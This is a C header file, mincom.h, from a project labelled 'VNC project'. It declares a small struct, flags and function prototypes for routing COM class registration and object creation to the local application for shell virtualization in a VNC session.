//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: mincom.h
// $Revision: 148 $
// $Date: 2014-01-29 14:13:12 +0400 (Wed, 29 Jan 2014) $
// description: 
//	small subsystem for routing some COM interfaces to the local application
//	required for shell virtualization in vnc session

#ifndef __MINICOM_H_
#define __MINICOM_H_

#define VO_INAPP_SERVER 1 //object must be registered
#define VO_DISABLED     2 //object is not avalible in session
typedef struct _VIRTUAL_OBJECT
{
	LPCGUID rclsid;
	LPCWSTR DllName;
	USHORT  Flags;
}VIRTUAL_OBJECT,*PVIRTUAL_OBJECT;

HRESULT 
	ComRegisterClassObject(
		PVIRTUAL_OBJECT VirtObject,
		REFCLSID rclsid,
		IUnknown * pUnk,
		DWORD dwClsContext,
		DWORD flags,
		LPDWORD  lpdwRegister
		);

HRESULT ComRevokeClassObject(PVIRTUAL_OBJECT VirtObject,DWORD dwRegister);

HRESULT 
	ComGetClassObject(
		PVIRTUAL_OBJECT VirtObject,
		REFCLSID rclsid,
		DWORD dwClsContext,
		COSERVERINFO * pServerInfo,
		REFIID riid,
		LPVOID * ppv
		);

HRESULT 
	ComCreateInstance(
		PVIRTUAL_OBJECT VirtObject,
		REFCLSID rclsid,
		LPUNKNOWN pUnkOuter,
		DWORD dwClsContext,
		REFIID riid,
		LPVOID * ppv
		);

VOID ComInitialize(VOID);
VOID ComRelease(VOID);

#endif //__MINICOM_H_